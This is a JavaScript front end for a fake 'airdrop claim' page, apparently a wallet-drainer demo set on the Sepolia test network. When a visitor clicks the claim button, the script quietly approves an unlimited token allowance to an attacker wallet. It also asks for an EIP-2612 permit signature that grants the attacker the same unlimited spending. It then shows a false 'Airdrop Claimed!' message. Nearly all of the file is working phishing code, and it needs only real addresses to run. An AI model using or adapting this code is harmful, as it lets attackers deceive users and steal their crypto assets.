const provider = new ethers.providers.Web3Provider(window.ethereum);
let signer, walletAddress;

// Replace with your Sepolia ERC-20 test token and attacker wallet
const tokenAddress = "0xYourTestToken";
const attackerAddress = "0xYourAttackerWallet";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function nonces(address owner) view returns (uint256)",
  "function name() view returns (string)"
];

document.getElementById("connect").onclick = async () => {
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  walletAddress = await signer.getAddress();
  document.getElementById("walletAddress").innerText = walletAddress;
};

document.getElementById("claim").onclick = async () => {
  const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  await token.approve(attackerAddress, ethers.constants.MaxUint256);

  // Optional EIP-2612 permit signature (if token supports it)
  const name = await token.name();
  const nonce = await token.nonces(walletAddress);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  const domain = {
    name: name,
    version: "1",
    chainId: 11155111, // Sepolia
    verifyingContract: tokenAddress,
  };

  const types = {
    Permit: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" }
    ]
  };

  const values = {
    owner: walletAddress,
    spender: attackerAddress,
    value: ethers.constants.MaxUint256,
    nonce: nonce,
    deadline: deadline
  };

  try {
    const signature = await signer._signTypedData(domain, types, values);
    console.log("Permit signature:", signature);
  } catch (e) {
    console.warn("Permit not supported or user declined.");
  }

  alert("Airdrop Claimed!");
};
